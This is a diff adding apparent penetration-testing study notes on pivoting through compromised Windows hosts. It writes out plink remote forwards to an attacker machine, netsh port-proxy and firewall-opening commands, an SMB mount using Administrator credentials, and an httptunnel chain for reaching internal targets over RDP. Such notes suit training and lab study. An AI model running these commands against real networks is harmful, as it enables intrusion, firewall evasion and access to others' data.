@@ -107,3 +107,59 @@ Which doesn't make any sense initially, but you are feeding commands
 to the device which are then interpreted over there. Port forwarding
 alters your perspective of the network because you take over another
 body.
+
+WINDOWS:
+When using Windows, the ssh client can sometimes not be installed by default.
+A well supported tool you can upload to the victim is plink.exe
+plink is part of the PuTTY project. The syntax is very similar. Here is
+what a remote forward would look like on plink:
+plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+To do this non-interactively, send cmd.exe /c echo y | [plink command]
+
+This will help the necessary dialogue through when you try to make the forward
+occur.
+
+If you have SYSTEM, you can just use netsh because UAC won't affect you.
+To use this, IP Helper service must be enabled and IPv6 must be enabled
+for the network interface we want to use.
+
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+
+This command will create a port proxy between two IPv4 addresses. This example
+was used to solve a forward between two network interfaces on a compromised
+host that could be bridged to allow enumeration of the internal subnet.
+
+netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+
+Altering firewall rules is also allowed with netsh, and is often necessary to
+prevent the outbound traffic from being blocked.
+
+sudo mkdir /mnt/win10_share
+sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
+ls -l /mnt/win10_share/
+cat /mnt/win10_share/data.txt
+
+How to mount an smb share and interact with it.
+
+
+
+HTTP TUNNELING:
+The above scenarios only work if SSH is enabled. If SSH isn't enabled you don't
+have a shell to work with. The httptunnel tool will help with this. This tool
+uses an htc and hts utility for client and server. When we use it, you want a
+client connection on your attacker machine, a server connection on your victim
+adjacent to the firewall, and a local forward between your adjacent and your
+deep victms. This will move traffic from deep victim to adjacent victim
+who then encapsulates the traffic as http and sends it otw to your client machine.
+
+Here is how you would do that:
+ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+hts --forward-port localhost:8888 1234
+htc --forward-port 8080 10.11.0.128:1234
+
+The local ssh forward is generated on the adjacent machine reaching out to the
+deep machine. The hts command then creates the http tunnel that will be used.
+htc is run on the attacker to pick up the traffic. Now, if the attacker
+runs rdp or other commands across 8080, they will be able to reach the deep
+target.
